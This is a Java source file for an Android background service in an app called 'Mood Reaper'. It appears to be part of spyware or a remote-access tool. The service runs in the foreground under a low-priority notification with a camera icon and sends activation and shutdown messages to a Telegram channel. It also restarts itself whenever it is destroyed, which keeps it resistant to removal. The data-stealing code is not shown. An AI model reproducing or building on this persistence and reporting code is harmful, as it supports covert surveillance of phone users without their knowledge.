package com.mood.reaper;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;

public class ReaperService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("reaper_channel", "Reaper", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "reaper_channel")
                .setContentTitle("🌙 Mood Reaper")
                .setContentText("Running in background...")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setPriority(NotificationCompat.PRIORITY_LOW);

        startForeground(1, builder.build());

        Utils.sendToTelegram("✅ Mood Reaper v2.0 Activated!");
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        Utils.sendToTelegram("⚠️ Service stopped—restarting...");
        startService(new Intent(this, ReaperService.class));
        super.onDestroy();
    }
}